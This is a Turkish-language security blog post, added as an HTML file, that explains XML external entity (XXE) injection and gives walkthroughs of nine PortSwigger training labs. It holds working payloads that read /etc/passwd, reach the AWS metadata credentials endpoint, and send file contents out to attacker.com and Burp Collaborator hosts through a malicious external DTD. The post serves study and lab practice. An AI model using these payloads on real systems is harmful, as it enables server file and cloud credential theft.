@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XML external entity (XXE) injection | Neslihan Gürgen</title>
+    <link rel="stylesheet" href="/style.css">
+        <link rel="icon"
+          type="image/png"
+          href="/assets/favicon.png">
+</head>
+
+<body>
+
+    <header class="navbar">
+
+    <nav>
+
+        <a href="/">Home</a>
+
+        <a href="/posts/">Posts</a>
+
+        <a href="/research/">Research</a>
+
+        <a href="/projects/">Projects</a>
+
+        <a href="/categories/">Categories</a>
+
+        <a href="/cheat-sheets/">Cheat Sheets</a>
+
+    </nav>
+
+</header>
+
+    <div class="page">
+
+        <aside class="sidebar">
+
+        <div class="profile-image">
+            <img src="/assets/pinguu.jpg" alt="Neslihan Gürgen">        </div>
+
+        <h1>Neslihan Gürgen</h1>
+
+        <p class="role">
+            Junior Penetration Tester
+        </p>
+
+        <p class="bio">
+            Application Security |
+            Penetration Testing
+        </p>
+
+        <div class="social-links">
+            <a href="https://medium.com/@grgnes" target="_blank">Medium</a>
+            <a href="mailto:ngurgen08@gmail.com">Email</a>
+            <a href="https://github.com/grgnes" target="_blank">GitHub</a>
+            <a href="https://www.linkedin.com/in/neslihan-gurgen/" target="_blank">LinkedIn</a>
+        </div>
+
+    </aside>
+
+        <main class="content">
+            <article class="post-page">
+
+    <a class="category"
+       href="/categories/portswigger/">
+        PortSwigger
+    </a>
+
+    <h1>XML external entity (XXE) injection</h1>
+
+    <div class="date">
+        August 06, 2026
+    </div>
+
+    <div class="tags">
+        
+        <span>PortSwigger</span>
+        
+        <span>Web Security</span>
+        
+        <span>XXE</span>
+        
+        <span>XML</span>
+        
+    </div>
+
+    <div class="post-content">
+        <h2 id="introduction">Introduction</h2>
+
+<p>XXE (XML External Entity), XML verisini işleyen uygulamalarda görülen zafiyettir. Bu zafiyet XML parserin kullanıcıdan gelen CML içindeki harici dosya veya URL tanımlarına güvenerek işlemesinden kaynaklanır.</p>
+
+<p>Normalde XML yalnızca verir taşır:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;user&gt;
+    &lt;name&gt;Neslihan&lt;/name&gt;
+&lt;/user&gt;
+</code></pre></div></div>
+
+<p>Saldırgan bu XML’in içine xxe adında bir değişken oluşturabilir ve değeri olarakta sunucudaki dosyaları çağırmayı deneyebilir:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>DOCTYPE user <span class="o">[</span>
+    &lt;<span class="o">!</span>ENTITY xxe SYSTEM <span class="s2">"file:///etc/passwd"</span><span class="o">&gt;</span> → dosya
+<span class="o">]&gt;</span>
+
+&lt;user&gt;
+    &lt;name&gt;&amp;xxe<span class="p">;</span>&lt;/name&gt; → değişken
+&lt;/user&gt;
+</code></pre></div></div>
+
+<p>Parser bu komutu çalıştırır ve &amp;xxe; gördüğü yere dosyanın içeriğini yerleştirir. Saldırgan aslında sunucuya bana bu dosyayı oku demiş olur ve parser de bunu gerçekleştirir.</p>
+
+<h4 id="blind-xxe">Blind XXE</h4>
+
+<p>XXE açığını bulunduğu ancak uygulamanın bana doğrudan çıktı vermediği durumdur. Aynı payload gönderilir ama response olarak sadece mesaj düşer. Örneğin <em>Stock updated successfully.</em> <strong>**veya **</strong><em>200 OK</em> gibi. Yani /etc/passwd okunmuş olsa bile çıktıyı görünmez.</p>
+
+<p>Açığı doğrulamak için, dosyayı ekrana yazdırmak yerine sunucunun bana istek atmasını sağlarım.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>DOCTYPE <span class="nb">test</span> <span class="o">[</span>
+&lt;<span class="o">!</span>ENTITY xxe SYSTEM <span class="s2">"http://attacker.com"</span><span class="o">&gt;</span>  → kendi sunucum
+<span class="o">]&gt;</span>
+
+&lt;stockCheck&gt;
+    &lt;productId&gt;&amp;xxe<span class="p">;</span>&lt;/productId&gt;
+&lt;/stockCheck&gt;
+</code></pre></div></div>
+
+<p>Kendi sunucumda veya burp collaboratorda istek görürsem, XXE’in çalıştığını doğrulamış olurum.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
+Host: attacker.com
+</code></pre></div></div>
+
+<h4 id="dtd-nedir">DTD nedir?</h4>
+
+<p>DTD (Document Type Definition), XML’e kurallar ve tanımlar eklemek için kullanılan bir yapıdır.</p>
+
+<p>Normal bir XML şöyle görünür:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
+</code></pre></div></div>
+
+<p>Ama XML’in başına bir DTD eklediğimizde:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!DOCTYPE stockCheck [
+
+]&gt;
+
+&lt;stockCheck&gt;
+    &lt;productId&gt;1&lt;/productId&gt;
+    &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre></div></div>
+
+<p>Parser XML’İ okumadan önce DTD bloğunu okur. Bu yüzden XXE saldırıları genellikle DTD içinde yapılır.</p>
+
+<p>Bazen dışarıdan DTD indirilmediğinde, bu engellendiğinde local DTD kullanılır. Sunuculardan bazen işletim sistemiyle birlikte gelen DTD dosyaları bulunur.</p>
+
+<ul>
+  <li>/usr/share/yelp/dtd/docbookx.dtd</li>
+  <li>/usr/share/xml/docbook/xml-dtd-4.5/docbookx.dtd   gibi. Parser bu dosyalara erişebilir.</li>
+</ul>
+
+<h4 id="error-based-xxe">Error-Based XXE</h4>
+
+<p>Error-based XXE, XML parser’ın oluşturduğu hata mesajlarını kullanarak hassas verileri elde etme yöntemidir.</p>
+
+<p>Normal XXE’de parser dosyanın içeriğini doğrudan döndürür. Ancak bazı uygulamalar bunu engeller. Böyle durumlarda saldırgan, parser’ın hata mesajlarını kullanarak veriyi sızdırmaya çalışır.</p>
+
+<p>Diyelim ki sunucuda şu dosya var:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/passwd
+</code></pre></div></div>
+
+<p>Normalde uygulama bu dosyanın içeriğini bana göstermiyor. Bu yüzden parser’a önce /etc/passwd dosyasını okutup sonra dosya içeriğini kullanarak var olmayan bir dosyaya eriştirmeye çalışılır.</p>
+
+<p>Bu durumda hassas veri uygulamanın normal cevabından değil, parser’ın oluşturduğu hata mesajından elde edilir.</p>
+
+<h4 id="xinclude-nedir">XInclude nedir?</h4>
+
+<p>XInclude, bir XML belgesinin içine başka bir dosya veya XML belgesi eklemeye yarayan XML özelliğidir. Yani parser’a git şu dosyayı al ve buraya ekle demenin yoludur.</p>
+
+<h2 id="cheat-sheet">Cheat Sheet</h2>
+<p>Check out the related XXE Cheat Sheet:
+<strong><a href="/cheat-sheets/#xxe">XXE Cheat Sheet</a></strong></p>
+
+<h2 id="labs">Labs</h2>
+
+<h3 id="01-exploiting-xxe-using-external-entities-to-retrieve-files"><strong>01. Exploiting XXE using external entities to retrieve files</strong></h3>
+
+<p>Ürün stoğunu kontrol etmek için gönderilen isteği Burp Suite ile yakaladığımda, uygulamanın XML formatında veri kabul ettiğini görüyorum.</p>
+
+<p><img src="/assets/posts/xxe/image.png" width="700" /></p>
+
+<p>Bu istekte, <code class="language-plaintext highlighter-rouge">xxe</code> adında bir <strong>external entity</strong> tanımlayıp değerini <code class="language-plaintext highlighter-rouge">file:///etc/passwd</code> olarak belirliyorum. Daha sonra <code class="language-plaintext highlighter-rouge">&amp;xxe;</code> ifadesini XML içine eklediğimde, XML parser bu entity’yi çözümler ve sunucudaki <code class="language-plaintext highlighter-rouge">/etc/passwd</code> dosyasını okuyarak içeriğini <code class="language-plaintext highlighter-rouge">&amp;xxe;</code> yerine yerleştirir.</p>
+
+<p><img src="/assets/posts/xxe/image (1).png" width="700" /></p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt; 
+&lt;<span class="o">!</span>DOCTYPE <span class="nb">test</span> <span class="o">[</span> &lt;<span class="o">!</span>ENTITY xxe SYSTEM <span class="s2">"file:///etc/passwd"</span><span class="o">&gt;]&gt;</span>
+&lt;stockCheck&gt;
+   &lt;productId&gt;
+      &amp;xxe<span class="p">;</span>
+   &lt;/productId&gt;
+   &lt;storeId&gt;
+        1 
+    &lt;/storeId&gt;
+ &lt;/stockCheck&gt;
+</code></pre></div></div>
+
+<h3 id="02-exploiting-xxe-to-perform-ssrf-attacks"><strong>02. Exploiting XXE to perform SSRF attacks</strong></h3>
+
+<p>Yine ürün stoğunu kontrol etmek için gönderilen isteği Burp Suite ile yakaladığımda, uygulamanın XML formatında veri kabul ettiğini görüyorum.</p>
+
+<p><img src="/assets/posts/xxe/image (2).png" width="700" /></p>
+
+<p>Bu lab’da amaç, XXE kullanarak sunucunun iç ağdaki bir adrese HTTP isteği göndermesini (SSRF) sağlamaktır. Önceki labdan farklı olarak bu kez SYSTEM ifadesi bir dosyayı değil, <code class="language-plaintext highlighter-rouge">http://169.254.169.254</code> adresini hedef alır. XML parser bu URL’yi işlediğinde isteği kendi bulunduğu sunucudan gönderir ve dönen cevabı uygulamaya iletir. Bu sayede normalde dışarıdan erişilemeyen AWS Metadata Service’e erişilerek IAM rolüne ait geçici kimlik bilgileri elde edilebilir.</p>
+
+<p><img src="/assets/posts/xxe/image (3).png" width="700" /></p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
+&lt;<span class="o">!</span>DOCTYPE <span class="nb">test</span> <span class="o">[</span> &lt;<span class="o">!</span>ENTITY xxe SYSTEM <span class="s2">"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"</span><span class="o">&gt;</span> <span class="o">]&gt;</span>
+
+&lt;stockCheck&gt;
+    &lt;productId&gt;
+        &amp;xxe<span class="p">;</span>
+    &lt;/productId&gt;
+    &lt;storeId&gt;
+       1
+    &lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre></div></div>
+
+<h3 id="03-blind-xxe-with-out-of-band-interaction"><strong>03. Blind XXE with out-of-band interaction</strong></h3>
+
+<p>Yine ürün stoğunu kontrol etmek için gönderilen isteği Burp Suite ile yakaladığımda, uygulamanın XML formatında veri kabul ettiğini görüyorum.</p>
+
+<p><img src="/assets/posts/xxe/image (4).png" width="700" /></p>
+
+<p>Bu lab’da uygulama XXE payload’ını işlese bile herhangi bir çıktı döndürmediği için <strong>Blind XXE</strong> söz konusudur. Bu nedenle dosya okumak yerine <code class="language-plaintext highlighter-rouge">SYSTEM</code> ile Burp Collaborator adresini hedef gösteriyorum.</p>
+
+<p><img src="/assets/posts/xxe/image (5).png" width="700" /></p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
+   &lt;<span class="o">!</span>DOCTYPE stockCheck <span class="o">[</span> &lt;<span class="o">!</span>ENTITY xxe SYSTEM 
+   <span class="s2">"http://k7s0w0smzzthwvnf7hv6l4mkqbw2ks8h.oastify.com"</span><span class="o">&gt;</span> <span class="o">]&gt;</span>
+   &lt;stockCheck&gt;
+       &lt;productId&gt; 
+          &amp;xxe<span class="p">;</span>
+       &lt;/productId&gt;
+       &lt;storeId&gt;
+           1
+       &lt;/storeId&gt;
+    &lt;/stockCheck&gt;
+</code></pre></div></div>
+
+<p>XML parser bu adresi işlediğinde sunucu Burp Collaborator’a bir DNS/HTTP isteği gönderiyor ve bu istek, XXE açığının başarıyla çalıştığını doğrulamamı sağlıyor.</p>
+
+<p><img src="/assets/posts/xxe/image (6).png" width="700" /></p>
+
+<h3 id="04-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities"><strong>04. Blind XXE with out-of-band interaction via XML parameter entities</strong></h3>
+
+<p>Bu labda ürün stoğunu kontrol etmek için gönderilen XML isteğini yakalıyorum. Normal XXE denemesi yaptığımda izin verilmediğini görüyorum. Bu uygulama normal entity kullanımı engelliyor.</p>
+
+<p><img src="/assets/posts/xxe/image (7).png" width="700" /></p>
+
+<p>Bu nedenle saldırıyı <strong>parameter entity (<code class="language-plaintext highlighter-rouge">%</code>)</strong> kullanarak gerçekleştiriyorum.</p>
+
+<p><img src="/assets/posts/xxe/image (8).png" width="700" /></p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
+&lt;<span class="o">!</span>DOCTYPE foo <span class="o">[</span>
+    &lt;<span class="o">!</span>ENTITY % xxe SYSTEM <span class="s2">"http://j6qzvzrlyysgvume6gu5k3ljpav3j07p.oastify.com"</span><span class="o">&gt;</span>
+    %xxe<span class="p">;</span>
+<span class="o">]&gt;</span>
+&lt;stockCheck&gt;
+    &lt;productId&gt;1&lt;/productId&gt;
+    &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre></div></div>
+
+<h3 id="05-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd"><strong>05. Exploiting blind XXE to exfiltrate data using a malicious external DTD</strong></h3>
+
+<p>Bu lab’da öncelikle <strong>malicious (zararlı) bir external DTD</strong> dosyası (<code class="language-plaintext highlighter-rouge">exploit.dtd</code>) hazırlıyorum. Bu DTD dosyası, sunucudaki <code class="language-plaintext highlighter-rouge">/etc/passwd</code> dosyasını okuyup içeriğini Burp Collaborator adresine gönderecek şekilde yapılandırılıyor.</p>
+
+<p><img src="/assets/posts/xxe/image (9).png" width="700" /></p>
+
+<ul>
+  <li>Payload</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>ENTITY % file SYSTEM <span class="s2">"file:///etc/hostname"</span><span class="o">&gt;</span>
+&lt;<span class="o">!</span>ENTITY % <span class="nb">eval</span> <span class="s2">"&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'&gt;"</span><span class="o">&gt;</span>
+%eval<span class="p">;</span>
+%exfil<span class="p">;</span>
+</code></pre></div></div>
+
+<p>Daha sonra hazırladığım <code class="language-plaintext highlighter-rouge">exploit.dtd</code> dosyasının URL’sini, ürün stoğunu kontrol etmek için gönderilen XML isteğindeki <code class="language-plaintext highlighter-rouge">DOCTYPE</code> tanımına ekleyerek isteği gönderiyorum. XML parser önce bu harici DTD dosyasını indiriyor, ardından DTD içindeki komutları çalıştırarak <code class="language-plaintext highlighter-rouge">/etc/passwd</code> dosyasını okuyor ve içeriğini Burp Collaborator’a gönderiyor.</p>
+
+<p><img src="/assets/posts/xxe/image (10).png" width="700" /></p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
+&lt;<span class="o">!</span>DOCTYPE foo <span class="o">[</span>
+   &lt;<span class="o">!</span>ENTITY % xxe SYSTEM <span class="s2">"https://exploit-0a450050033f13d783fc9c3c01e200f6.exploit-server.net/exploit.dtd"</span><span class="o">&gt;</span> %xxe<span class="p">;</span><span class="o">]&gt;</span>
+       &lt;stockCheck&gt;
+            &lt;productId&gt;
+                1
+            &lt;/productId&gt;
+            &lt;storeId&gt;
+                1
+            &lt;/storeId&gt;
+        &lt;/stockCheck&gt;
+</code></pre></div></div>
+
+<p>Son olarak Burp Collaborator’ı kontrol ettiğimde, gönderilen isteğin içerisinde <code class="language-plaintext highlighter-rouge">/etc/passwd</code> dosyasının içeriğinin yer aldığını görüyorum.</p>
+
+<p><img src="/assets/posts/xxe/image (11).png" width="700" /></p>
+
+<h3 id="06-exploiting-blind-xxe-to-retrieve-data-via-error-messages"><strong>06. Exploiting blind XXE to retrieve data via error messages</strong></h3>
+
+<p>Öncelikle Exploit Server üzerinde bir <strong><code class="language-plaintext highlighter-rouge">exploit.dtd</code></strong> dosyası hazırlıyorum. Bu DTD dosyası, sunucudaki <code class="language-plaintext highlighter-rouge">/etc/passwd</code> dosyasını okuyup dosya içeriğini var olmayan bir dosya yoluna ekleyerek XML parser’ın hata mesajı üretmesini sağlıyor.</p>
+
+<ul>
+  <li>Payload
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>ENTITY % file SYSTEM <span class="s2">"file:///etc/passwd"</span><span class="o">&gt;</span>
+&lt;<span class="o">!</span>ENTITY % <span class="nb">eval</span> <span class="s2">"&lt;!ENTITY &amp;#x25; exfil SYSTEM 'file:///invalid/%file;'&gt;"</span><span class="o">&gt;</span>
+%eval<span class="p">;</span>
+%exfil<span class="p">;</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p><img src="/assets/posts/xxe/image (12).png" width="700" /></p>
+
+<p>Daha sonra hazırladığım <code class="language-plaintext highlighter-rouge">exploit.dtd</code> dosyasının URL’sini ürün stoğunu kontrol etmek için gönderilen XML isteğinin <code class="language-plaintext highlighter-rouge">DOCTYPE</code> tanımına ekleyerek isteği gönderiyorum. XML parser harici DTD dosyasını indiriyor, içindeki payload’ı çalıştırıyor ve oluşan hata mesajının içerisinde <code class="language-plaintext highlighter-rouge">/etc/passwd</code> dosyasının içeriği yer alıyor.</p>
+
+<p><img src="/assets/posts/xxe/image (13).png" width="700" /></p>
+
+<h3 id="07-exploiting-xinclude-to-retrieve-files"><strong>07. Exploiting XInclude to retrieve files</strong></h3>
+
+<p>Bu lab’da önceki XXE lablarından farklı olarak istek XML formatında değil, <strong>form verisi (<code class="language-plaintext highlighter-rouge">application/x-www-form-urlencoded</code>)</strong> olarak gönderiliyor.</p>
+
+<p><img src="/assets/posts/xxe/image (14).png" width="700" /></p>
+
+<p>Uygulamanın arka planda XML kullanıp kullanmadığını anlamak için <code class="language-plaintext highlighter-rouge">productId</code> parametresine basit bir XML payload’ı gönderiyorum.</p>
+
+<ul>
+  <li>Payload</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">productId</span><span class="o">=</span>&lt;<span class="nb">test</span><span class="o">&gt;</span>1&lt;/test&gt;&amp;storeId<span class="o">=</span>1
+</code></pre></div></div>
+
+<p>Uygulamadan dönen XML parse hatası, gönderdiğim verinin sunucu tarafında bir XML belgesinin içerisine yerleştirildiğini gösteriyor. Bu sayede klasik XXE kullanamasam da, XML’in bir parçasını kontrol edebildiğimi anlıyorum.</p>
+
+<p><img src="/assets/posts/xxe/image (15).png" width="700" /></p>
+
+<p>Ardından <code class="language-plaintext highlighter-rouge">productId</code> parametresine <strong>XInclude</strong> payload’ını ekleyerek XML parser’ın <code class="language-plaintext highlighter-rouge">file:///etc/passwd</code> dosyasını okumasını sağlıyor ve kullanıcı bilgilerini elde ediyorum.</p>
+
+<p><img src="/assets/posts/xxe/image (16).png" width="700" /></p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">productId</span><span class="o">=</span>&lt;foo xmlns:xi<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XInclude"</span><span class="o">&gt;</span>&lt;xi:include <span class="nv">parse</span><span class="o">=</span><span class="s2">"text"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"file:///etc/passwd"</span>/&gt;&lt;/foo&gt;
+&amp;storeId<span class="o">=</span>1
+</code></pre></div></div>
+
+<h3 id="08-exploiting-xxe-via-image-file-upload"><strong>08. Exploiting XXE via image file upload</strong></h3>
+
+<p>Bu lab’da uygulamanın <strong>SVG formatında avatar yüklemeye izin verdiğini</strong> görüyorum. SVG dosyaları XML tabanlı olduğu için içerisine XXE payload’ı ekleyerek XML parser’ın sunucudaki dosyaları okumasını sağlayabiliyorum.</p>
+
+<p><img src="/assets/posts/xxe/image (17).png" width="700" /></p>
+
+<p>Hazırladığım XXE içeren SVG dosyasını yorum eklerken avatar olarak yüklüyor ve isteği gönderiyorum.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">standalone</span><span class="o">=</span><span class="s2">"yes"</span>?&gt;
+&lt;<span class="o">!</span>DOCTYPE <span class="nb">test</span> <span class="o">[</span>
+    &lt;<span class="o">!</span>ENTITY xxe SYSTEM <span class="s2">"file:///etc/hostname"</span><span class="o">&gt;</span>
+<span class="o">]&gt;</span>
+&lt;svg <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/2000/svg"</span> <span class="nv">version</span><span class="o">=</span><span class="s2">"1.1"</span><span class="o">&gt;</span>
+    &lt;text <span class="nv">x</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">y</span><span class="o">=</span><span class="s2">"16"</span><span class="o">&gt;</span>&amp;xxe<span class="p">;</span>&lt;/text&gt;
+&lt;/svg&gt;
+</code></pre></div></div>
+
+<p><img src="/assets/posts/xxe/image (18).png" width="700" /></p>
+
+<p><img src="/assets/posts/xxe/image (19).png" width="700" /></p>
+
+<p>Yorum başarıyla oluşturulduktan sonra sayfa kaynağını görüntülediğimde yüklediğim SVG dosyasının kullanıldığını görüyorum. Avatar görüntülenirken XML parser payload’ı işlediği için <code class="language-plaintext highlighter-rouge">/etc/hostname</code> dosyasının içeriği SVG içerisine eklenmiş oluyor.</p>
+
+<p><img src="/assets/posts/xxe/image (20).png" width="700" /></p>
+
+<h3 id="09-exploiting-xxe-to-retrieve-data-by-repurposing-a-local-dtd"><strong>09. Exploiting XXE to retrieve data by repurposing a local DTD</strong></h3>
+
+<p>Bu labda, sunucuda bulunan yerel bir DTD dosyası kullanılarak XML parser’ın hata mesajı oluşturması sağlanıyor. Hata mesajı içerisine yerleştirilen <code class="language-plaintext highlighter-rouge">/etc/passwd</code> dosyasının içeriği sayesinde hassas veriler elde ediliyor.</p>
+
+<p><img src="/assets/posts/xxe/image (21).png" width="700" /></p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
+&lt;<span class="o">!</span>DOCTYPE message <span class="o">[</span>
+&lt;<span class="o">!</span>ENTITY % local_dtd SYSTEM <span class="s2">"file:///usr/share/yelp/dtd/docbookx.dtd"</span><span class="o">&gt;</span>
+&lt;<span class="o">!</span>ENTITY % ISOamso <span class="s1">'
+&lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;
+&amp;#x25;eval;
+&amp;#x25;error;
+'</span><span class="o">&gt;</span>
+%local_dtd<span class="p">;</span>
+<span class="o">]&gt;</span>&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
+</code></pre></div></div>
+
+    </div>
+
+</article>
+        </main>
+
+    </div>
+
+    <footer>
+    © 2026 Neslihan Gürgen
+</footer>
+
+</body>
+</html>
